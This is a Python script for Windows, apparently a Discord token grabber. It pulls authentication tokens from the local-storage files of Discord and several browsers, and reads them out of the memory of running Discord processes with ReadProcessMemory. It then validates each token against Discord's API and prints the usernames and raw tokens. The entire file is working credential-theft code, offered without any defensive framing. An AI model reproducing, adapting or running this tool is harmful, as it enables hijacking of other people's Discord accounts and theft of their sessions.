import ctypes
import ctypes.wintypes as wintypes
import os
import re
import sys
import time
from pathlib import Path

import psutil
import requests

RST  = "\x1b[0m"
RED  = "\x1b[31m"
GRN  = "\x1b[32m"
YLW  = "\x1b[33m"
CYN  = "\x1b[36m"
MGT  = "\x1b[35m"
CYNB = "\x1b[96m"
GRNB = "\x1b[92m"

TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,38}")
MFA_RE   = re.compile(r"mfa\.[\w-]{84}")
AUTH_ANCHOR = b"Authorization"
V8_ANCHOR   = b"\x6D\x00\x00\x00\x05token\x6D\x00\x00\x00\x03"

PROCESS_VM_READ          = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT  = 0x1000
MEM_IMAGE   = 0x1000000
PAGE_READABLE = {0x02, 0x04, 0x08, 0x20, 0x40, 0x80}

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll    = ctypes.WinDLL("ntdll",    use_last_error=True)

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress",       ctypes.c_void_p),
        ("AllocationBase",    ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize",        ctypes.c_size_t),
        ("State",             wintypes.DWORD),
        ("Protect",           wintypes.DWORD),
        ("Type",              wintypes.DWORD),
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1",                ctypes.c_void_p),
        ("PebBaseAddress",           ctypes.c_void_p),
        ("Reserved2",                ctypes.c_void_p * 2),
        ("UniqueProcessId",          ctypes.c_size_t),
        ("InheritedFromUniqueProcessId", ctypes.c_size_t),
    ]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length",        wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer",        ctypes.c_void_p),
    ]

def clscr():
    os.system("cls")

def enable_ansi():
    handle = kernel32.GetStdHandle(-11)
    mode = wintypes.DWORD()
    kernel32.GetConsoleMode(handle, ctypes.byref(mode))
    kernel32.SetConsoleMode(handle, mode.value | 4)

def open_process(pid):
    return kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)

def read_process_memory(h, base, size):
    buf = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t()
    ok = kernel32.ReadProcessMemory(h, ctypes.c_void_p(base), buf, size, ctypes.byref(bytes_read))
    return buf.raw[:bytes_read.value] if ok and bytes_read.value > 0 else None

def virtual_query_ex(h, address):
    mbi = MEMORY_BASIC_INFORMATION()
    size = ctypes.sizeof(mbi)
    ret = kernel32.VirtualQueryEx(h, ctypes.c_void_p(address), ctypes.byref(mbi), size)
    return mbi if ret else None

def classify_pid(pid):
    h = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
    if not h:
        return "unknown"
    try:
        pbi = PROCESS_BASIC_INFORMATION()
        status = ntdll.NtQueryInformationProcess(h, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
        if status != 0 or not pbi.PebBaseAddress:
            return "unknown"
        pp = ctypes.c_void_p()
        rd = ctypes.c_size_t()
        kernel32.ReadProcessMemory(h, pbi.PebBaseAddress + 0x20, ctypes.byref(pp), ctypes.sizeof(pp), ctypes.byref(rd))
        if not pp.value:
            return "unknown"
        us = UNICODE_STRING()
        kernel32.ReadProcessMemory(h, pp.value + 0x70, ctypes.byref(us), ctypes.sizeof(us), ctypes.byref(rd))
        if us.Length == 0 or not us.Buffer:
            return "unknown"
        buf = ctypes.create_string_buffer(us.Length)
        kernel32.ReadProcessMemory(h, us.Buffer, buf, us.Length, ctypes.byref(rd))
        cl = buf.raw[:us.Length].decode("utf-16-le", errors="ignore")
        if "--type=renderer" in cl:   return "renderer"
        if "--type=gpu-process" in cl: return "gpu"
        if "--type=utility" in cl:    return "utility"
        if "--type=crashpad" in cl:   return "crashpad"
        if "--type=" in cl:           return "other"
        return "main"
    except Exception:
        return "unknown"
    finally:
        kernel32.CloseHandle(h)

def get_process_name(pid):
    try:
        return psutil.Process(pid).name()
    except Exception:
        return "unknown"

def extract_tokens_from_file(path):
    tokens = set()
    try:
        data = Path(path).read_bytes()
        text = data.decode("utf-8", errors="ignore")
        tokens.update(TOKEN_RE.findall(text))
        tokens.update(MFA_RE.findall(text))
    except Exception:
        pass
    return tokens

def find_anchor(buf):
    idx = buf.find(AUTH_ANCHOR)
    if idx >= 0:
        return idx
    idx = buf.find(V8_ANCHOR)
    return idx

def scan_process_fast(h):
    found = False
    address = 0
    while True:
        mbi = virtual_query_ex(h, address)
        if not mbi or mbi.RegionSize == 0:
            break
        if (mbi.State == MEM_COMMIT
            and mbi.Protect in PAGE_READABLE
            and not (mbi.Type & MEM_IMAGE)
            and mbi.RegionSize > 0
            and mbi.RegionSize < 50 * 1024 * 1024):
            buf = read_process_memory(h, address, mbi.RegionSize)
            if buf:
                hit = find_anchor(buf)
                if hit >= 0:
                    found = True
                    win = min(len(buf) - hit, 768)
                    text = buf[hit:hit + win].decode("utf-8", errors="ignore")
                    yield from TOKEN_RE.findall(text)
                    yield from MFA_RE.findall(text)
        next_addr = address + mbi.RegionSize
        if next_addr <= address:
            break
        address = next_addr

def scan_process_full(h, name, pid):
    total = 0
    print(f"{YLW}  {name} pid {pid} heap scan:{RST}")
    address = 0
    while True:
        mbi = virtual_query_ex(h, address)
        if not mbi or mbi.RegionSize == 0:
            break
        if (mbi.State == MEM_COMMIT
            and mbi.Protect in PAGE_READABLE
            and not (mbi.Type & MEM_IMAGE)
            and mbi.RegionSize > 0
            and mbi.RegionSize < 50 * 1024 * 1024):
            print(f"{YLW}    region 0x{address:016X} size {mbi.RegionSize}{RST}")
            buf = read_process_memory(h, address, mbi.RegionSize)
            if buf:
                total += len(buf)
                text = buf.decode("utf-8", errors="ignore")
                yield from TOKEN_RE.findall(text)
                yield from MFA_RE.findall(text)
        next_addr = address + mbi.RegionSize
        if next_addr <= address:
            break
        address = next_addr
    print(f"{YLW}    {name} pid {pid} heap size {total} bytes{RST}")

def scan_discord_processes():
    discord_pids = []
    for p in psutil.process_iter(["pid", "name"]):
        try:
            n = p.info["name"].lower()
            if n in ("discord.exe", "discordptb.exe", "discordcanary.exe"):
                discord_pids.append(p.info["pid"])
        except Exception:
            pass

    if not discord_pids:
        print(f"{RED}Discord is not running{RST}")
        return set()

    bearing = []
    for pid in discord_pids:
        name = get_process_name(pid)
        kind = classify_pid(pid)
        if kind in ("main", "renderer", "unknown"):
            bearing.append((pid, name, kind))

    print(f"{YLW}Discord processes: {len(discord_pids)}, token-bearing: {len(bearing)}{RST}")
    if not bearing:
        print(f"{RED}No token-bearing Discord processes{RST}")
        return set()

    print(f"{CYN}Scanning for authorization headers and V8 token keys...{RST}")
    result = set()
    found_fast = False
    for pid, name, _ in bearing:
        h = open_process(pid)
        if not h:
            continue
        for token in scan_process_fast(h):
            result.add(token)
            found_fast = True
        kernel32.CloseHandle(h)

    if found_fast:
        print(f"{GRN}Fast scan found candidates, skipping full heap scan.{RST}")
        return result

    print(f"{YLW}Fast scan found nothing, falling back to full memory scan...{RST}")
    for pid, name, _ in bearing:
        h = open_process(pid)
        if not h:
            continue
        for token in scan_process_full(h, name, pid):
            result.add(token)
        kernel32.CloseHandle(h)
    return result

def validate_token(token):
    try:
        resp = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "User-Agent": "TokenExtractor/1.0"},
            timeout=10,
        )
        if resp.status_code != 200:
            return None
        m = re.search(r'"username":"([^"]+)"', resp.text)
        return m.group(1) if m else None
    except Exception:
        return None

def main():
    enable_ansi()
    clscr()

    local = os.environ.get("LOCALAPPDATA", "")
    roam  = os.environ.get("APPDATA", "")

    paths = {
        "Discord":        os.path.join(roam, "discord",        "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(roam, "discordcanary",  "Local Storage", "leveldb"),
        "Discord PTB":    os.path.join(roam, "discordptb",     "Local Storage", "leveldb"),
        "Chrome":         os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "Edge":           os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        "Brave":          os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
    }

    candidates = set()

    print(f"{CYN}Scanning local files for Discord tokens...{RST}")
    for name, path in paths.items():
        if not os.path.exists(path):
            print(f"{RED}  Path not found: {path}{RST}")
            continue
        print(f"{CYN}  Scanning {name} at {path}{RST}")
        try:
            for entry in os.scandir(path):
                if entry.is_file() and entry.name.endswith((".ldb", ".log")):
                    try:
                        tokens = extract_tokens_from_file(entry.path)
                        candidates.update(tokens)
                        print(f"{GRN}    Processed file: {entry.name}{RST}")
                    except Exception as e:
                        print(f"{RED}    Error reading {entry.name}: {e}{RST}")
        except Exception as e:
            print(f"{RED}  Error scanning {name}: {e}{RST}")

    valid_accounts = []

    print(f"\n{CYNB}Validating tokens found in files...{RST}")
    for token in list(candidates):
        username = validate_token(token)
        if username:
            valid_accounts.append((username, token))
            print(f"{GRN}  Valid token found for user: {username}{RST}")
    if not valid_accounts:
        print(f"{RED}No valid accounts found in files{RST}")

    mem_candidates = scan_discord_processes()
    print(f"{CYNB}Validating tokens found in memory...{RST}")
    found_in_memory = 0
    for token in mem_candidates:
        if any(t == token for _, t in valid_accounts):
            continue
        username = validate_token(token)
        if username:
            valid_accounts.append((username, token))
            found_in_memory += 1
            print(f"{GRN}  New valid token found in memory for user: {username}{RST}")
    if found_in_memory == 0:
        print(f"{RED}No other accounts found using memory scan{RST}")

    print(f"\n{CYNB}Following Discord Accounts Were Found:{RST}")
    for username, token in valid_accounts:
        print(f"{YLW}Username          :   {RST}{username}")
        print(f"{MGT}Account Token     :   {RST}{token}")
        print()
    if not valid_accounts:
        print(f"{RED}No valid Discord accounts found{RST}")

    print(f"\n{CYNB}Press Any Key To Exit...{RST}")
    import msvcrt
    msvcrt.getch()

if __name__ == "__main__":
    main()
